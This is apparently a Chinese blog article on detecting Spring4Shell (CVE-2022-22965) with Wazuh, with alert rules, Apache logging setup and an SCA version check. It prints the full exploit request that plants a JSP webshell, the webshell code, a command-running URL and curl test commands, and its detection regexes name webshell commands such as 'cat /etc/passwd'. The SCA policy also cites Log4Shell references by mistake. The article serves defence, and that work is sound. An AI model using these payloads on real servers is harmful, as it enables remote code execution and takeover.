# 漏洞描述

在`Spring框架`的`JDK9版本（及以上版本）`中，远程攻击者可在满足特定条件的基础上，通过框架的参数绑定功能获取`Ac``c``e``ss``Log``Valve`对象并诸如恶意字段值，从而触发`pipeline`机制并写入任意路径下的文件。漏洞被称为 `S``p``ring4S``hel``l` 或 `Sprin``g``Shell`。其编号为`CVE-2022-2``2``965` ，CVSS 评分为 `9.8`。

触发该漏洞需要满足两个基本条件：

* 使用`JDK9及以上`版本的`Spring MVC`框架
* `s``p``ring-webmv``c` 或 `spring-w``e``bflux依赖`
spring framework `5.3``.0-``5.3``.1``7`、`5.``2.``0-``5.2.1``9`版本，以及更早的版本。

* 

本篇文章通过分析该漏洞的POC之后，编写了Wazuh的检测规则，以便检测该漏洞的攻击和评估内网受影响范围。

# POC分析

为了获得初始访问权限，攻击者会发送一个HTTP请求，其数据部分包含Spring4Shell payload，该payload将会生成一个JSP的webshell并上传到目标服务器上。下面是通常情况下发送的网络请求的样本：

```plain
POST / HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 762

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
该payload在Tomcat根目录下上传了一个带密码的webshell（用pwd参数进行身份验证（密码始终为j）和cmd参数用于执行命令），其内容为:
```plain
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))3D-1){ out.println(new String(b)); } } -
```
为了通过这个webshell调用命令，攻击者只要发出一个web请求，在cmd参数中加入所需的命令，例如:
```plain
http://localhost/tomcatwar.jsp?pwd=j&cmd=whoami
```
# WAZUH 规则编写

### 检测攻击请求

为了检测spring4shell的攻击，我们在Wazuh的管理端创建如下规则：

`/var/ossec/etc/rules/local_rules.xml`

```plain
<group name="spring4shell, attack,">
  <rule id="110001" level="12">
    <if_group>web|accesslog|attack</if_group>
    <regex type="pcre2">%25%7Bc2%7Di%20if\(%22j%22.equals\(request.getParameter\(%22pwd%22\)\)\)%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime\S*.exec\(request.getParameter\(%22cmd%22\)\).getInputStream\(\)%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while\(\(a%3Din.read\(b\)\)\S*3D-1\)%7B%20out.println\(new%20String\(b\)\)%3B%20%7D%20%7D%20%25%7Bsuffix%7Di</regex>
    <description>Possible Spring4Shell RCE (CVE-2022-22965) attack attempt detected.</description>
    <mitre>
      <id>T1190</id>
      <id>T1210</id>
      <id>T1211</id>
    </mitre>
  </rule>

  <rule id="110002" level="12">
    <if_group>web|accesslog|attack</if_group>
    <regex type="pcre2">\.jsp\?pwd=\S*\x26cmd=\S*|\.jsp\?cmd=\S*\x26pwd=\S*|\.jsp\?id=(whoami|cat%20\/etc\/passwd|cat+\/etc\/passwd|ifconfig|ipconfig)</regex>
    <description>JSP webshell HTTP request pattern detected.</description>
    <mitre>
      <id>T1190</id>
      <id>T1210</id>
      <id>T1211</id>
    </mitre>
  </rule>
</group>
```
然后重启管理端
```plain
systemctl restart wazuh-manager
```
为了使规则生效，有一个重要的注意事项，就是我们必须将服务器上的Wazuh agent上配置为`将网络访问日志（access log和error log）转发给管理``端``进行分析`，这里下面会介绍。
举个栗子：

我们在Ubuntu上运行一个Apache，默认情况下，Apache不记录POST请求的正文内容，我们通过以下步骤启用对POST请求内容的记录。

step 1 : enable dump_io

```plain
sudo a2enmod dump_io

```
step 2 : 在/etc/apache2/apache2.conf中添加如下内容：
```plain
DumpIOInput On #开启DumpIOInput
LogLevel dumpio:trace7 # 将LogLevel设置为dumpio:trace7
```
step 3 : 重启服务器
```plain
systemctl restart apache2
```
step 4 : 配置日志转发 配置完之后我们就可以记录POST请求啦，接下来需要做的是将日志转发给`W``a``zuh管理端`。这里只需要编辑代理配置文件，指定Apache`的access.log`和`error.log`的路径就可以啦。在`/var/ossec/etc/``o``s``s``e``c``.conf`的`<``o``sse``c``_con``fi``g>`部分添加以下几行内容：
```plain
<localfile>
  <log_format>apache</log_format>
  <location>/var/log/apache2/access.log</location>
  <location>/var/log/apache2/error.log</location>
</localfile>
```
step 5：重启wazuh agent
```plain
systemctl restart wazuh-agent
```
测试一下：
```plain
curl -v -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://WEB_SERVER/

curl -X GET "http://WEB_SERVER/tomcatwar.jsp?pwd=j&cmd=whoami"
```
### 检测受影响的Spring framework版本

和上篇文章一样[利用wazuh检测](http://mp.weixin.qq.com/s?__biz=MzI1ODA2MDgzOQ==&mid=2247484787&idx=1&sn=0229d2564880f70db1ac86d6f2f6b1a9&chksm=ea0ca23bdd7b2b2d0624982640dd0d4061e4ff65627aa55a86c8dda786e4e043a8e0623aa950&scene=21#wechat_redirect)[log4j](http://mp.weixin.qq.com/s?__biz=MzI1ODA2MDgzOQ==&mid=2247484787&idx=1&sn=0229d2564880f70db1ac86d6f2f6b1a9&chksm=ea0ca23bdd7b2b2d0624982640dd0d4061e4ff65627aa55a86c8dda786e4e043a8e0623aa950&scene=21#wechat_redirect)[ ](http://mp.weixin.qq.com/s?__biz=MzI1ODA2MDgzOQ==&mid=2247484787&idx=1&sn=0229d2564880f70db1ac86d6f2f6b1a9&chksm=ea0ca23bdd7b2b2d0624982640dd0d4061e4ff65627aa55a86c8dda786e4e043a8e0623aa950&scene=21#wechat_redirect)[sh](http://mp.weixin.qq.com/s?__biz=MzI1ODA2MDgzOQ==&mid=2247484787&idx=1&sn=0229d2564880f70db1ac86d6f2f6b1a9&chksm=ea0ca23bdd7b2b2d0624982640dd0d4061e4ff65627aa55a86c8dda786e4e043a8e0623aa950&scene=21#wechat_redirect)[e](http://mp.weixin.qq.com/s?__biz=MzI1ODA2MDgzOQ==&mid=2247484787&idx=1&sn=0229d2564880f70db1ac86d6f2f6b1a9&chksm=ea0ca23bdd7b2b2d0624982640dd0d4061e4ff65627aa55a86c8dda786e4e043a8e0623aa950&scene=21#wechat_redirect)[ll](http://mp.weixin.qq.com/s?__biz=MzI1ODA2MDgzOQ==&mid=2247484787&idx=1&sn=0229d2564880f70db1ac86d6f2f6b1a9&chksm=ea0ca23bdd7b2b2d0624982640dd0d4061e4ff65627aa55a86c8dda786e4e043a8e0623aa950&scene=21#wechat_redirect)，这里我们用到的是`SCA`。

step 1 : 创建`/v``a``r/``oss``ec/e``t``c/s``har``ed/def``a``ul``t``/sp``rin``g4sh``e``ll``_c``h``ec``k.y``ml`

```plain
policy:
  id: "spring4shell_check"
  file: "spring4shell_check.yml"
  name: "Spring4Shell dependency check"
  description: "This document provides prescriptive guidance for identifying Spring4Shell RCE vulnerability"
  references:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance
requirements:
  title: "Check if Java is present on the machine"
  description: "Requirements for running the SCA scan against machines with Java on them."
  condition: all
  rules:
    - 'c:sh -c "ps aux | grep java | grep -v grep" -> r:java'
checks:
  - id: 10000
    title: "Ensure Spring framework is not under 5.3.18 or 5.2.20."
    description: "The Spring framework is vulnerable to Spring4Shell RCE (CVE-2022-22965) on versions 5.3.0 to 5.3.17, and 5.2.0 to 5.2.19"
    remediation: "Update the Spring framework to version 5.3.18 or 5.2.20"
    condition: none
    rules:
      - 'c:find / -name "*.jar" -type f -exec sh -c "if unzip -l {} | grep org/springframework/; then unzip -p {} META-INF/MANIFEST.MF; fi | grep Implementation-Version" \; -> r:5.3.0$|5.3.1$|5.3.2$|5.3.3$|5.3.4$|5.3.5$|5.3.6$|5.3.7$|5.3.8$|5.3.9$|5.3.10$|5.3.11$|5.3.12$|5.3.13$|5.3.14$|5.3.15$|5.3.16$|5.3.17$|5.2.0$|5.2.1$|5.2.2$|5.2.3$|5.2.4$|5.2.5$|5.2.6$|5.2.7$|5.2.8$|5.2.9$|5.2.10$|5.2.11$|5.2.12$|5.2.13$|5.2.14$|5.2.15$|5.2.16$|5.2.17$|5.2.18$|5.2.19$'
```
>这里用的是find，比较耗性能，请谨慎使用！
step 2 : 修改文件权限(Wazuh 4.3.)

```plain
chown wazuh:wazuh /var/ossec/etc/shared/default/spring4shell_check.yml
```
step 3 : 在   `/``v``ar/``o``ssec/e``tc``/share``d``/``d``e``f``a``u``lt/a``g``e``n``t``.``co``nf`中添加`SCA`模块，以便在属于默认组的Wazuh代理上启用新策略。
```plain
<agent_config os="linux">
  <sca>
    <enabled>yes</enabled>
    <scan_on_start>yes</scan_on_start>
    <interval>24h</interval>
    <skip_nfs>yes</skip_nfs>    
    <policies> 
      <policy>/var/ossec/etc/shared/spring4shell_check.yml</policy>  
    </policies>
  </sca>
</agent_config>
```
在agent端执行：
```plain
echo "sca.remote_commands=1" >> /var/ossec/etc/local_internal_options.conf
```
这一修改的目的是使节点能接受Wazuh管理器的SCA策略中的命令并执行。
接着，我们需要重启agent:

```plain
systemctl restart wazuh-agent
```
最后，不出意外的话，我们可以从SCA扫描结果知道该服务器上存在的Spring framework版本是否受影响。

# Reference

1. [h](https://blog.joe1sn.top/2022/04/01/spring4shell/)[ttps:/](https://blog.joe1sn.top/2022/04/01/spring4shell/)[/blog.](https://blog.joe1sn.top/2022/04/01/spring4shell/)[jo](https://blog.joe1sn.top/2022/04/01/spring4shell/)[e](https://blog.joe1sn.top/2022/04/01/spring4shell/)[1](https://blog.joe1sn.top/2022/04/01/spring4shell/)[s](https://blog.joe1sn.top/2022/04/01/spring4shell/)[n.](https://blog.joe1sn.top/2022/04/01/spring4shell/)[top/](https://blog.joe1sn.top/2022/04/01/spring4shell/)[2022](https://blog.joe1sn.top/2022/04/01/spring4shell/)[/](https://blog.joe1sn.top/2022/04/01/spring4shell/)[04](https://blog.joe1sn.top/2022/04/01/spring4shell/)[/](https://blog.joe1sn.top/2022/04/01/spring4shell/)[01/](https://blog.joe1sn.top/2022/04/01/spring4shell/)[s](https://blog.joe1sn.top/2022/04/01/spring4shell/)[pr](https://blog.joe1sn.top/2022/04/01/spring4shell/)[i](https://blog.joe1sn.top/2022/04/01/spring4shell/)[ng4](https://blog.joe1sn.top/2022/04/01/spring4shell/)[shel](https://blog.joe1sn.top/2022/04/01/spring4shell/)[l/](https://blog.joe1sn.top/2022/04/01/spring4shell/)
2. [https://documentation.wazuh.com/current/](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[user-manual/capab](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[i](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[lities/sec-co](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[n](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[fig-assessment/cr](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[e](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[ating-custom-policies](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[.html](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)[?highlight=sca](https://documentation.wazuh.com/current/user-manual/capabilities/sec-config-assessment/creating-custom-policies.html?highlight=sca)
3. 

 

